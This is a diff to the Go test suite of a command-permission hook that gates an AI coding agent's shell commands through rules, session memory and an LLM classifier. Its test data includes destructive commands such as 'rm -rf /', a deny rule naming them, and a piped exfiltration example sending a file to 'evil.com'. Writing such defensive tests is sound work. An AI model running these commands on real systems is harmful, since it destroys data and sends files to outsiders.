@@ -8,6 +8,7 @@ import (
 	"net/http"
 	"net/http/httptest"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"strings"
 	"testing"
@@ -35,6 +36,18 @@ func captureStdout(fn func()) string {
 	fn()
 	w.Close()
 	os.Stdout = old
+	var buf bytes.Buffer
+	io.Copy(&buf, r)
+	return buf.String()
+}
+
+func captureStderr(fn func()) string {
+	old := os.Stderr
+	r, w, _ := os.Pipe()
+	os.Stderr = w
+	fn()
+	w.Close()
+	os.Stderr = old
 	var buf bytes.Buffer
 	io.Copy(&buf, r)
 	return buf.String()
@@ -1039,10 +1052,13 @@ func TestCmdStatus(t *testing.T) {
 	defer cleanup()
 
 	sid := "status-test-session"
-	AppendLine(sid, "approved", "ls -la")
-	AppendLine(sid, "approved", "git status")
-	AppendLine(sid, "asked", "curl https://example.com")
-	AppendLine(sid, "denied", "rm -rf /tmp/data")
+	// cmdStatus uses cwd to compute project session ID
+	cwd, _ := os.Getwd()
+	projSID := ProjectSessionID(sid, cwd)
+	AppendLine(projSID, "approved", "ls -la")
+	AppendLine(projSID, "approved", "git status")
+	AppendLine(projSID, "asked", "curl https://example.com")
+	AppendLine(projSID, "denied", "rm -rf /tmp/data")
 
 	os.Setenv("CLAUDE_SESSION_ID", sid)
 	defer os.Unsetenv("CLAUDE_SESSION_ID")
@@ -1974,8 +1990,9 @@ func TestCmdHookPostToolUse(t *testing.T) {
 	if out != "" {
 		t.Errorf("PostToolUse should produce no output, got: %s", out)
 	}
-	// Should have saved to approved
-	if !ContainsLine("hook-e2e-1", "approved", "curl https://example.com") {
+	// Should have saved to approved under project-scoped session ID
+	projSID := ProjectSessionID("hook-e2e-1", "/tmp")
+	if !ContainsLine(projSID, "approved", "curl https://example.com") {
 		t.Error("should save to approved on PostToolUse")
 	}
 }
@@ -1984,8 +2001,9 @@ func TestCmdHookSessionAllow(t *testing.T) {
 	_, cleanup := withFakeHome(t)
 	defer cleanup()
 
-	// Pre-approve a command
-	AppendLine("hook-e2e-2", "approved", "ls -la")
+	// Pre-approve a command under project-scoped session ID
+	projSID := ProjectSessionID("hook-e2e-2", "/tmp")
+	AppendLine(projSID, "approved", "ls -la")
 
 	payload := `{"hook_event_name":"PreToolUse","tool_name":"Bash","session_id":"hook-e2e-2","cwd":"/tmp","tool_input":{"command":"ls -la"}}`
 	out := runHookWithPayload(t, payload)
@@ -2150,7 +2168,8 @@ func TestCmdHookSessionDeny(t *testing.T) {
 	defer cleanup()
 
 	// Simulate: was asked, never approved → denied on retry
-	AppendLine("hook-e2e-3", "asked", "rm -rf /tmp/data")
+	projSID := ProjectSessionID("hook-e2e-3", "/tmp")
+	AppendLine(projSID, "asked", "rm -rf /tmp/data")
 
 	payload := `{"hook_event_name":"PreToolUse","tool_name":"Bash","session_id":"hook-e2e-3","cwd":"/tmp","tool_input":{"command":"rm -rf /tmp/data"}}`
 	out := runHookWithPayload(t, payload)
@@ -2167,8 +2186,9 @@ func TestCmdHookExplicitDeny(t *testing.T) {
 	_, cleanup := withFakeHome(t)
 	defer cleanup()
 
-	// Explicitly denied
-	AppendLine("hook-e2e-4", "denied", "dangerous cmd")
+	// Explicitly denied under project-scoped session ID
+	projSID := ProjectSessionID("hook-e2e-4", "/tmp")
+	AppendLine(projSID, "denied", "dangerous cmd")
 
 	payload := `{"hook_event_name":"PreToolUse","tool_name":"Bash","session_id":"hook-e2e-4","cwd":"/tmp","tool_input":{"command":"dangerous cmd"}}`
 	out := runHookWithPayload(t, payload)
@@ -2235,8 +2255,9 @@ func TestCmdHookDenyRuleBeatsSessionApproval(t *testing.T) {
 	defer os.Chdir(origCwd)
 
 	sid := "deny-beats-session"
-	// Pre-approve the dangerous command in session memory
-	AppendLine(sid, "approved", "rm -rf /")
+	// Pre-approve the dangerous command in session memory (project-scoped)
+	projSID := ProjectSessionID(sid, projectDir)
+	AppendLine(projSID, "approved", "rm -rf /")
 
 	payload := fmt.Sprintf(`{"hook_event_name":"PreToolUse","tool_name":"Bash","session_id":"%s","cwd":"%s","tool_input":{"command":"rm -rf /"}}`, sid, projectDir)
 	out := runHookWithPayload(t, payload)
@@ -2299,8 +2320,9 @@ func TestCmdHookRuleAsk(t *testing.T) {
 	if !strings.Contains(out, `"permissionDecision":"ask"`) {
 		t.Errorf("rule should ask about curl, got: %s", out)
 	}
-	// Should save to asked
-	if !ContainsLine("hook-e2e-7", "asked", "curl https://example.com") {
+	// Should save to asked under project-scoped session ID
+	projSID := ProjectSessionID("hook-e2e-7", "/tmp")
+	if !ContainsLine(projSID, "asked", "curl https://example.com") {
 		t.Error("ask rule should save to .asked")
 	}
 }
@@ -2387,8 +2409,9 @@ func TestCmdHookLLMAllow(t *testing.T) {
 	if !strings.Contains(out, `"permissionDecision":"allow"`) {
 		t.Errorf("LLM allow should result in allow, got: %s", out)
 	}
-	// Should save to approved
-	if !ContainsLine("llm-test-1", "approved", "go test ./...") {
+	// Should save to approved under project-scoped session ID
+	projSID := ProjectSessionID("llm-test-1", projectDir)
+	if !ContainsLine(projSID, "approved", "go test ./...") {
 		t.Error("LLM allow should save to approved")
 	}
 }
@@ -2421,11 +2444,12 @@ func TestCmdHookLLMAsk(t *testing.T) {
 	if !strings.Contains(out, `"permissionDecision":"ask"`) {
 		t.Errorf("LLM ask should result in ask, got: %s", out)
 	}
-	// Should save to asked (not approved)
-	if !ContainsLine("llm-test-2", "asked", "kubectl delete pod -n production") {
+	// Should save to asked (not approved) under project-scoped session ID
+	projSID := ProjectSessionID("llm-test-2", projectDir)
+	if !ContainsLine(projSID, "asked", "kubectl delete pod -n production") {
 		t.Error("LLM ask should save to asked")
 	}
-	if ContainsLine("llm-test-2", "approved", "kubectl delete pod -n production") {
+	if ContainsLine(projSID, "approved", "kubectl delete pod -n production") {
 		t.Error("LLM ask should NOT save to approved")
 	}
 }
@@ -2451,10 +2475,20 @@ func TestCmdHookLLMUnavailable(t *testing.T) {
 	payload := fmt.Sprintf(`{"hook_event_name":"PreToolUse","tool_name":"Bash","session_id":"llm-test-3","cwd":"%s","tool_input":{"command":"some-unknown-cmd"}}`, projectDir)
 	out := runHookWithPayload(t, payload)
 
-	// LLM unavailable → transparent (no output), Claude Code decides
+	// LLM unavailable → systemMessage warning, no permissionDecision
 	out = strings.TrimSpace(out)
-	if out != "" {
-		t.Errorf("LLM unavailable should produce no output (transparent), got: %s", out)
+	if out == "" {
+		t.Fatal("LLM unavailable should emit systemMessage, got empty output")
+	}
+	var r HookResponse
+	if err := json.Unmarshal([]byte(out), &r); err != nil {
+		t.Fatalf("invalid JSON output: %v", err)
+	}
+	if !strings.Contains(r.SystemMessage, "LLM unreachable") {
+		t.Errorf("systemMessage should contain 'LLM unreachable', got: %s", r.SystemMessage)
+	}
+	if r.HookSpecificOutput.PermissionDecision != "" {
+		t.Errorf("should have no permissionDecision, got: %s", r.HookSpecificOutput.PermissionDecision)
 	}
 }
 
@@ -2483,10 +2517,20 @@ func TestCmdHookLLMParseError(t *testing.T) {
 	payload := fmt.Sprintf(`{"hook_event_name":"PreToolUse","tool_name":"Bash","session_id":"llm-test-4","cwd":"%s","tool_input":{"command":"ambiguous-cmd"}}`, projectDir)
 	out := runHookWithPayload(t, payload)
 
-	// Parse error → transparent (no output), Claude Code decides
+	// Parse error → systemMessage warning, no permissionDecision
 	out = strings.TrimSpace(out)
-	if out != "" {
-		t.Errorf("parse error should produce no output (transparent), got: %s", out)
+	if out == "" {
+		t.Fatal("parse error should emit systemMessage, got empty output")
+	}
+	var r HookResponse
+	if err := json.Unmarshal([]byte(out), &r); err != nil {
+		t.Fatalf("invalid JSON output: %v", err)
+	}
+	if !strings.Contains(r.SystemMessage, "parse error") {
+		t.Errorf("systemMessage should contain 'parse error', got: %s", r.SystemMessage)
+	}
+	if r.HookSpecificOutput.PermissionDecision != "" {
+		t.Errorf("should have no permissionDecision, got: %s", r.HookSpecificOutput.PermissionDecision)
 	}
 }
 
@@ -2524,11 +2568,19 @@ func TestCmdHookLLMDownRulesStillWork(t *testing.T) {
 		t.Errorf("allow rule should still work when LLM is down, got: %s", out)
 	}
 
-	// Unknown command with no rule → transparent (LLM would decide but it's down)
+	// Unknown command with no rule → systemMessage warning (LLM would decide but it's down)
 	payload = fmt.Sprintf(`{"hook_event_name":"PreToolUse","tool_name":"Bash","session_id":"llm-down-3","cwd":"%s","tool_input":{"command":"some-unknown-cmd"}}`, projectDir)
 	out = strings.TrimSpace(runHookWithPayload(t, payload))
-	if out != "" {
-		t.Errorf("unknown cmd with LLM down should be transparent, got: %s", out)
+	if out == "" {
+		t.Errorf("unknown cmd with LLM down should emit systemMessage, got empty")
+	} else {
+		var r HookResponse
+		if err := json.Unmarshal([]byte(out), &r); err != nil {
+			t.Fatalf("invalid JSON: %v", err)
+		}
+		if !strings.Contains(r.SystemMessage, "LLM unreachable") {
+			t.Errorf("systemMessage should contain 'LLM unreachable', got: %s", r.SystemMessage)
+		}
 	}
 }
 
@@ -2558,8 +2610,9 @@ func TestCmdHookSessionSimilarity(t *testing.T) {
 	os.Chdir(projectDir)
 	defer os.Chdir(origCwd)
 
-	// Pre-approve a similar command
-	AppendLine("llm-test-5", "approved", "ls -la")
+	// Pre-approve a similar command under project-scoped session ID
+	projSID := ProjectSessionID("llm-test-5", projectDir)
+	AppendLine(projSID, "approved", "ls -la")
 
 	payload := fmt.Sprintf(`{"hook_event_name":"PreToolUse","tool_name":"Bash","session_id":"llm-test-5","cwd":"%s","tool_input":{"command":"ls -la /tmp"}}`, projectDir)
 	out := runHookWithPayload(t, payload)
@@ -2720,84 +2773,135 @@ func TestCmdProviderInteractiveRequiresTerminal(t *testing.T) {
 
 // --- cmdEvolve (non-interactive: skip all) ---
 
-func TestCmdEvolveNoDecisions(t *testing.T) {
+func TestNormalizeCommand_Simple(t *testing.T) {
+	got := normalizeCommand("kubectl get pods")
+	if got != "kubectl get pods" {
+		t.Errorf("expected 'kubectl get pods', got '%s'", got)
+	}
+}
+
+func TestNormalizeCommand_StripsUUIDs(t *testing.T) {
+	got := normalizeCommand("kubectl delete job abc123def456 -n dev")
+	// abc123def456 is 12 hex chars, matches [0-9a-f]{8,}
+	if got != "kubectl delete job" {
+		t.Errorf("expected 'kubectl delete job', got '%s'", got)
+	}
+}
+
+func TestNormalizeCommand_StripsLongNumbers(t *testing.T) {
+	// /tmp/cache-1234567890 contains non-hex chars (slash, dash), so it stays
+	got := normalizeCommand("rm /tmp/cache-1234567890")
+	if got != "rm /tmp/cache-1234567890" {
+		t.Errorf("expected 'rm /tmp/cache-1234567890', got '%s'", got)
+	}
+}
+
+func TestNormalizeCommand_LimitsTokens(t *testing.T) {
+	got := normalizeCommand("very long command with many tokens")
+	if got != "very long command" {
+		t.Errorf("expected 'very long command', got '%s'", got)
+	}
+}
+
+func TestNormalizeCommand_EmptyCommand(t *testing.T) {
+	got := normalizeCommand("")
+	if got != "" {
+		t.Errorf("expected empty string, got '%s'", got)
+	}
+}
+
+// --- timeWeight tests ---
+
+func TestTimeWeight_Recent(t *testing.T) {
+	ts := time.Now().Add(-1 * time.Hour).UTC().Format(time.RFC3339Nano)
+	w := timeWeight(ts)
+	if w != 1.0 {
+		t.Errorf("expected weight 1.0 for 1 hour ago, got %.2f", w)
+	}
+}
+
+func TestTimeWeight_LastWeek(t *testing.T) {
+	ts := time.Now().Add(-3 * 24 * time.Hour).UTC().Format(time.RFC3339Nano)
+	w := timeWeight(ts)
+	if w != 0.75 {
+		t.Errorf("expected weight 0.75 for 3 days ago, got %.2f", w)
+	}
+}
+
+func TestTimeWeight_Old(t *testing.T) {
+	ts := time.Now().Add(-60 * 24 * time.Hour).UTC().Format(time.RFC3339Nano)
+	w := timeWeight(ts)
+	if w != 0.25 {
+		t.Errorf("expected weight 0.25 for 60 days ago, got %.2f", w)
+	}
+}
+
+// --- evolve logic tests ---
+
+func TestEvolve_SkipsExistingRules(t *testing.T) {
+	// Create decisions for "cat" commands
+	now := time.Now().UTC().Format(time.RFC3339Nano)
+	var entries []DecisionEntry
+	for i := 0; i < 5; i++ {
+		entries = append(entries, DecisionEntry{
+			Timestamp: now,
+			SessionID: "s1",
+			Command:   fmt.Sprintf("cat file%d.txt", i),
+			Layer:     "llm",
+			Decision:  "ask",
+		})
+	}
+
+	// Existing rule covers "cat *"
+	rules := []Rule{{Action: "allow", Type: "cmd", Pattern: "cat*"}}
+
+	findings := collectEvolveFindings(entries, rules)
+	for _, f := range findings {
+		if f.Pattern == "cat" {
+			t.Errorf("should have skipped 'cat' pattern because rule 'cat*' already covers it")
+		}
+	}
+}
+
+func TestEvolve_DetectsRepeatedAsk(t *testing.T) {
+	now := time.Now().UTC().Format(time.RFC3339Nano)
+	var entries []DecisionEntry
+	for i := 0; i < 5; i++ {
+		entries = append(entries, DecisionEntry{
+			Timestamp: now,
+			SessionID: "s1",
+			Command:   fmt.Sprintf("docker compose down --volumes arg%d", i),
+			Layer:     "llm",
+			Decision:  "ask",
+		})
+	}
+
+	findings := collectEvolveFindings(entries, nil)
+	found := false
+	for _, f := range findings {
+		if f.Pattern == "docker compose down" {
+			found = true
+			if f.Category != "REPEATED ASK" {
+				t.Errorf("expected category REPEATED ASK, got %s", f.Category)
+			}
+			if f.Count != 5 {
+				t.Errorf("expected count 5, got %d", f.Count)
+			}
+			break
+		}
+	}
+	if !found {
+		t.Errorf("should find 'docker compose down' pattern, findings: %+v", findings)
+	}
+}
+
+func TestEvolve_EmptyLog(t *testing.T) {
 	_, cleanup := withFakeHome(t)
 	defer cleanup()
 
 	out := captureStdout(func() { cmdEvolve() })
 	if !strings.Contains(out, "No decision log") {
-		t.Errorf("should say no decisions, got: %s", out)
-	}
-}
-
-func TestCmdEvolveNoPatterns(t *testing.T) {
-	_, cleanup := withFakeHome(t)
-	defer cleanup()
-
-	// Only 1 of each → not enough to trigger (needs 3+)
-	LogDecision(DecisionEntry{SessionID: "s1", Command: "ls", Layer: "llm", Decision: "ask", Confidence: 0.7})
-	LogDecision(DecisionEntry{SessionID: "s1", Command: "cat /etc/hosts", Layer: "llm", Decision: "ask", Confidence: 0.7})
-
-	out := captureStdout(func() { cmdEvolve() })
-	if !strings.Contains(out, "No patterns") {
-		t.Errorf("should say no patterns, got: %s", out)
-	}
-}
-
-func TestCmdEvolveFindsPatterns(t *testing.T) {
-	_, cleanup := withFakeHome(t)
-	defer cleanup()
-
-	// Create 5 asks with identical first 3 tokens: "kubectl delete pod ..."
-	for i := 0; i < 5; i++ {
-		LogDecision(DecisionEntry{
-			SessionID: "s1",
-			Command:   fmt.Sprintf("kubectl delete pod my-pod-%d -n production", i),
-			Layer:     "llm", Decision: "ask", Confidence: 0.7,
-		})
-	}
-
-	// Skip all findings
-	out := runWithStdin(t, "d\nd\nd\nd\nd\n", func() { cmdEvolve() })
-	if !strings.Contains(out, "EVOLVE:") {
-		t.Errorf("should show EVOLVE header, got: %s", out)
-	}
-	if !strings.Contains(out, "REPEATED ASK") {
-		t.Errorf("should find repeated ask pattern, got: %s", out)
-	}
-}
-
-func TestCmdEvolveApplyRule(t *testing.T) {
-	dir, cleanup := withFakeHome(t)
-	defer cleanup()
-
-	for i := 0; i < 5; i++ {
-		LogDecision(DecisionEntry{
-			SessionID: "s1",
-			Command:   fmt.Sprintf("kubectl delete pod staging-pod-%d -n staging", i),
-			Layer:     "llm", Decision: "ask", Confidence: 0.7,
-		})
-	}
-
-	projectDir := filepath.Join(dir, "project")
-	os.MkdirAll(projectDir, 0755)
-	os.WriteFile(filepath.Join(projectDir, ".yolonot"), []byte("# existing\n"), 0644)
-	origCwd, _ := os.Getwd()
-	os.Chdir(projectDir)
-	defer os.Chdir(origCwd)
-
-	// Input: a (allow first finding), p (project scope), q (quit remaining)
-	// The apply confirmation may fail due to bufio reader buffering, but
-	// we verify the evolve code path executed (found patterns, presented them)
-	out := runWithStdin(t, "a\np\nq\ny\n", func() { cmdEvolve() })
-	if !strings.Contains(out, "EVOLVE:") {
-		t.Errorf("should show EVOLVE header, got: %s", out)
-	}
-	if !strings.Contains(out, "REPEATED ASK") {
-		t.Errorf("should find patterns, got: %s", out)
-	}
-	if !strings.Contains(out, "Changes to apply") {
-		t.Errorf("should show changes summary, got: %s", out)
+		t.Errorf("should say no decisions for empty log, got: %s", out)
 	}
 }
 
@@ -2838,11 +2942,1116 @@ func TestCmdLogWithConfidenceAndReasoning(t *testing.T) {
 	}
 }
 
-func TestComparePromptContent(t *testing.T) {
-	if !strings.Contains(ComparePrompt, `"decision":"allow|ask"`) {
-		t.Error("compare prompt should use 2-class output")
+
+
+
+func TestCmdHookLLMTimeout(t *testing.T) {
+	dir, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	// Server that sleeps longer than timeout
+	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		time.Sleep(3 * time.Second)
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(map[string]interface{}{
+			"choices": []map[string]interface{}{
+				{"message": map[string]string{"content": `{"decision":"allow","reasoning":"safe"}`}},
+			},
+		})
+	}))
+	defer server.Close()
+
+	// Set timeout to 1 second so it expires before the 3-second sleep
+	SaveConfig(Config{Provider: ProviderConfig{URL: server.URL, Model: "test", Timeout: 1}})
+
+	projectDir := filepath.Join(dir, "project")
+	os.MkdirAll(projectDir, 0755)
+	origCwd, _ := os.Getwd()
+	os.Chdir(projectDir)
+	defer os.Chdir(origCwd)
+
+	payload := fmt.Sprintf(`{"hook_event_name":"PreToolUse","tool_name":"Bash","session_id":"llm-timeout","cwd":"%s","tool_input":{"command":"some-slow-cmd"}}`, projectDir)
+	out := strings.TrimSpace(runHookWithPayload(t, payload))
+
+	// Timeout -> systemMessage warning, no permissionDecision
+	if out == "" {
+		t.Fatal("LLM timeout should emit systemMessage, got empty output")
 	}
-	if !strings.Contains(ComparePrompt, "strict") {
-		t.Error("compare prompt should mention strict")
+	var r HookResponse
+	if err := json.Unmarshal([]byte(out), &r); err != nil {
+		t.Fatalf("invalid JSON output: %v", err)
+	}
+	if !strings.Contains(r.SystemMessage, "LLM unreachable") {
+		t.Errorf("systemMessage should contain 'LLM unreachable', got: %s", r.SystemMessage)
+	}
+	if r.HookSpecificOutput.PermissionDecision != "" {
+		t.Errorf("should have no permissionDecision, got: %s", r.HookSpecificOutput.PermissionDecision)
+	}
+}
+
+// --- cmdCheck dry-run tests ---
+
+func TestCheck_DenyRule(t *testing.T) {
+	_, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	projectDir := t.TempDir()
+	os.WriteFile(filepath.Join(projectDir, ".yolonot"), []byte("deny-cmd *rm -rf /*\n"), 0644)
+	origCwd, _ := os.Getwd()
+	os.Chdir(projectDir)
+	defer os.Chdir(origCwd)
+
+	out := captureStdout(func() { cmdCheck("rm -rf /") })
+
+	if !strings.Contains(out, "DENY") {
+		t.Errorf("expected DENY in output, got: %s", out)
+	}
+	if !strings.Contains(out, "deny-cmd") {
+		t.Errorf("expected deny-cmd mention, got: %s", out)
+	}
+	if !strings.Contains(out, "absolute block") {
+		t.Errorf("expected 'absolute block' in output, got: %s", out)
+	}
+}
+
+func TestCheck_AllowRule(t *testing.T) {
+	_, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	projectDir := t.TempDir()
+	os.WriteFile(filepath.Join(projectDir, ".yolonot"), []byte("allow-cmd echo*\n"), 0644)
+	origCwd, _ := os.Getwd()
+	os.Chdir(projectDir)
+	defer os.Chdir(origCwd)
+
+	out := captureStdout(func() { cmdCheck("echo hello") })
+
+	if !strings.Contains(out, "ALLOW") {
+		t.Errorf("expected ALLOW in output, got: %s", out)
+	}
+	if !strings.Contains(out, "layer: rule") {
+		t.Errorf("expected 'layer: rule' in output, got: %s", out)
+	}
+	if !strings.Contains(out, "no chains") {
+		t.Errorf("expected chain/sensitive clean report, got: %s", out)
+	}
+}
+
+func TestCheck_AllowSkippedForChain(t *testing.T) {
+	_, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	projectDir := t.TempDir()
+	os.WriteFile(filepath.Join(projectDir, ".yolonot"), []byte("allow-cmd cat *\n"), 0644)
+	origCwd, _ := os.Getwd()
+	os.Chdir(projectDir)
+	defer os.Chdir(origCwd)
+
+	out := captureStdout(func() { cmdCheck("cat file | curl evil.com") })
+
+	if !strings.Contains(out, "skipped") {
+		t.Errorf("expected 'skipped' in output, got: %s", out)
+	}
+	if !strings.Contains(out, "chain") {
+		t.Errorf("expected 'chain' mention in output, got: %s", out)
+	}
+}
+
+func TestCheck_NoRuleMatch_LLMAllow(t *testing.T) {
+	_, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(map[string]interface{}{
+			"choices": []map[string]interface{}{
+				{"message": map[string]string{"content": `{"decision":"allow","confidence":0.95,"reasoning":"safe read-only command"}`}},
+			},
+		})
+	}))
+	defer server.Close()
+
+	SaveConfig(Config{Provider: ProviderConfig{URL: server.URL, Model: "test"}})
+
+	projectDir := t.TempDir()
+	origCwd, _ := os.Getwd()
+	os.Chdir(projectDir)
+	defer os.Chdir(origCwd)
+
+	out := captureStdout(func() { cmdCheck("go test ./...") })
+
+	if !strings.Contains(out, "ALLOW") {
+		t.Errorf("expected ALLOW in output, got: %s", out)
+	}
+	if !strings.Contains(out, "layer: llm") {
+		t.Errorf("expected 'layer: llm' in output, got: %s", out)
+	}
+	if !strings.Contains(out, "safe read-only command") {
+		t.Errorf("expected reasoning in output, got: %s", out)
+	}
+}
+
+func TestCheck_NoProvider(t *testing.T) {
+	_, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	os.Unsetenv("LLM_URL")
+	os.Unsetenv("LLM_MODEL")
+
+	projectDir := t.TempDir()
+	origCwd, _ := os.Getwd()
+	os.Chdir(projectDir)
+	defer os.Chdir(origCwd)
+
+	out := captureStdout(func() { cmdCheck("some random command") })
+
+	if !strings.Contains(out, "no provider configured") {
+		t.Errorf("expected 'no provider configured' in output, got: %s", out)
+	}
+	if !strings.Contains(out, "PASS-THROUGH") {
+		t.Errorf("expected PASS-THROUGH in output, got: %s", out)
+	}
+}
+
+func TestCheck_AskRule(t *testing.T) {
+	_, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	projectDir := t.TempDir()
+	os.WriteFile(filepath.Join(projectDir, ".yolonot"), []byte("ask-cmd *curl *\n"), 0644)
+	origCwd, _ := os.Getwd()
+	os.Chdir(projectDir)
+	defer os.Chdir(origCwd)
+
+	out := captureStdout(func() { cmdCheck("curl https://example.com") })
+
+	if !strings.Contains(out, "ASK") {
+		t.Errorf("expected ASK in output, got: %s", out)
+	}
+	if !strings.Contains(out, "layer: rule") {
+		t.Errorf("expected 'layer: rule' in output, got: %s", out)
+	}
+}
+
+
+// --- filterByPrefix / firstToken ---
+
+func TestFilterByPrefix_MatchingSameExecutable(t *testing.T) {
+	approved := []string{"kubectl get pods", "kubectl logs x", "ls -la"}
+	got := filterByPrefix("kubectl delete pod x", approved)
+	if len(got) != 2 {
+		t.Fatalf("got %d matches, want 2: %v", len(got), got)
+	}
+	if got[0] != "kubectl get pods" || got[1] != "kubectl logs x" {
+		t.Errorf("got %v, want [kubectl get pods, kubectl logs x]", got)
+	}
+}
+
+func TestFilterByPrefix_NoMatch(t *testing.T) {
+	approved := []string{"ls -la", "cat file", "grep pattern"}
+	got := filterByPrefix("docker build .", approved)
+	if len(got) != 0 {
+		t.Errorf("got %v, want empty", got)
+	}
+}
+
+func TestFilterByPrefix_HandlesSudo(t *testing.T) {
+	approved := []string{"kubectl get pods"}
+	got := filterByPrefix("sudo kubectl delete pod", approved)
+	if len(got) != 1 {
+		t.Fatalf("got %d matches, want 1: %v", len(got), got)
+	}
+	if got[0] != "kubectl get pods" {
+		t.Errorf("got %v, want [kubectl get pods]", got)
+	}
+}
+
+func TestFilterByPrefix_LimitsTo10(t *testing.T) {
+	var approved []string
+	for i := 0; i < 15; i++ {
+		approved = append(approved, fmt.Sprintf("kubectl get pod-%d", i))
+	}
+	got := filterByPrefix("kubectl delete pod-999", approved)
+	if len(got) != 10 {
+		t.Fatalf("got %d matches, want 10", len(got))
+	}
+	// Should be the last 10
+	if got[0] != "kubectl get pod-5" {
+		t.Errorf("first match should be pod-5, got %s", got[0])
+	}
+	if got[9] != "kubectl get pod-14" {
+		t.Errorf("last match should be pod-14, got %s", got[9])
+	}
+}
+
+func TestFilterByPrefix_EmptyApproved(t *testing.T) {
+	got := filterByPrefix("docker build .", nil)
+	if len(got) != 0 {
+		t.Errorf("got %v, want nil/empty", got)
+	}
+
+	got = filterByPrefix("docker build .", []string{})
+	if len(got) != 0 {
+		t.Errorf("got %v, want nil/empty", got)
+	}
+}
+
+func TestFirstToken_Simple(t *testing.T) {
+	if got := firstToken("kubectl get pods"); got != "kubectl" {
+		t.Errorf("got %q, want kubectl", got)
+	}
+}
+
+func TestFirstToken_WithSudo(t *testing.T) {
+	if got := firstToken("sudo kubectl get pods"); got != "kubectl" {
+		t.Errorf("got %q, want kubectl", got)
+	}
+}
+
+func TestFirstToken_WithPath(t *testing.T) {
+	if got := firstToken("/usr/bin/kubectl get pods"); got != "kubectl" {
+		t.Errorf("got %q, want kubectl", got)
+	}
+}
+
+func TestFirstToken_WithEnvFlags(t *testing.T) {
+	if got := firstToken("env -u FOO kubectl get pods"); got != "kubectl" {
+		t.Errorf("got %q, want kubectl", got)
+	}
+}
+
+
+func TestHook_SimilaritySkippedWhenNoPrefix(t *testing.T) {
+	dir, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	// LLM server that tracks whether it was called
+	llmCalled := false
+	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		llmCalled = true
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(map[string]interface{}{
+			"choices": []map[string]interface{}{
+				{"message": map[string]string{"content": `{"decision":"allow","confidence":0.9,"reasoning":"safe command"}`}},
+			},
+		})
+	}))
+	defer server.Close()
+
+	os.Setenv("LLM_URL", server.URL)
+	os.Setenv("LLM_MODEL", "test-model")
+	defer os.Unsetenv("LLM_URL")
+	defer os.Unsetenv("LLM_MODEL")
+
+	// Empty project dir (no rules to match)
+	projectDir := filepath.Join(dir, "project")
+	os.MkdirAll(projectDir, 0755)
+	origCwd, _ := os.Getwd()
+	os.Chdir(projectDir)
+	defer os.Chdir(origCwd)
+
+	sid := "prefix-skip-test"
+	// Approve only ls commands
+	AppendLine(sid, "approved", "ls -la")
+	AppendLine(sid, "approved", "ls /tmp")
+	AppendLine(sid, "approved", "ls -R /var")
+
+	// Send a docker command — no prefix match with any approved command
+	payload := fmt.Sprintf(`{"hook_event_name":"PreToolUse","tool_name":"Bash","session_id":"%s","cwd":"%s","tool_input":{"command":"docker build ."}}`, sid, projectDir)
+	_ = runHookWithPayload(t, payload)
+
+	// The LLM WILL be called — but for Step 5 (analysis), not Step 2 (similarity).
+	// Verify no session_llm entry in the log (Step 2 was skipped).
+	entries := ReadRecentDecisions(10)
+	for _, e := range entries {
+		if e.Layer == "session_llm" {
+			t.Errorf("should NOT have session_llm log entry when no prefix match, got: %+v", e)
+		}
+	}
+
+	// The LLM should have been called once (Step 5 analysis), not for similarity
+	if !llmCalled {
+		t.Error("LLM should have been called for Step 5 analysis")
+	}
+}
+
+// --- Stats ---
+
+func writeTestDecisions(t *testing.T, entries []DecisionEntry) {
+	t.Helper()
+	path := filepath.Join(YolonotDir(), "decisions.jsonl")
+	var lines []string
+	for _, e := range entries {
+		data, _ := json.Marshal(e)
+		lines = append(lines, string(data))
+	}
+	os.WriteFile(path, []byte(strings.Join(lines, "\n")+"\n"), 0644)
+}
+
+func TestStats_EmptyLog(t *testing.T) {
+	_, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	out := captureStdout(func() {
+		cmdStats()
+	})
+	if !strings.Contains(out, "No decisions logged yet.") {
+		t.Errorf("expected 'No decisions logged yet.', got: %s", out)
+	}
+}
+
+func TestStats_BasicCounts(t *testing.T) {
+	_, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	entries := []DecisionEntry{
+		{Timestamp: "2026-04-01T10:00:00Z", Command: "ls", Decision: "allow", Layer: "rule", Project: "proj"},
+		{Timestamp: "2026-04-01T10:01:00Z", Command: "cat file", Decision: "allow", Layer: "rule", Project: "proj"},
+		{Timestamp: "2026-04-01T10:02:00Z", Command: "git status", Decision: "allow", Layer: "session", Project: "proj"},
+		{Timestamp: "2026-04-01T10:03:00Z", Command: "echo hello", Decision: "allow", Layer: "cache", Project: "proj"},
+		{Timestamp: "2026-04-01T10:04:00Z", Command: "go test", Decision: "allow", Layer: "llm", Project: "proj"},
+		{Timestamp: "2026-04-02T10:00:00Z", Command: "docker compose down", Decision: "ask", Layer: "llm", Project: "proj"},
+		{Timestamp: "2026-04-02T10:01:00Z", Command: "kubectl delete job x", Decision: "ask", Layer: "llm", Project: "proj"},
+		{Timestamp: "2026-04-02T10:02:00Z", Command: "git push origin main", Decision: "ask", Layer: "llm", Project: "proj"},
+		{Timestamp: "2026-04-03T10:00:00Z", Command: "rm -rf /", Decision: "deny", Layer: "rule", Project: "proj"},
+		{Timestamp: "2026-04-03T10:01:00Z", Command: "curl http://api", Decision: "passthrough", Layer: "llm", Project: "proj"},
+	}
+	writeTestDecisions(t, entries)
+
+	out := captureStdout(func() {
+		cmdStats()
+	})
+	if !strings.Contains(out, "Total decisions:   10") {
+		t.Errorf("expected total 10, got: %s", out)
+	}
+	if !strings.Contains(out, "Allowed:") || !strings.Contains(out, "5 (50%)") {
+		t.Errorf("expected 5 allowed (50%%), got: %s", out)
+	}
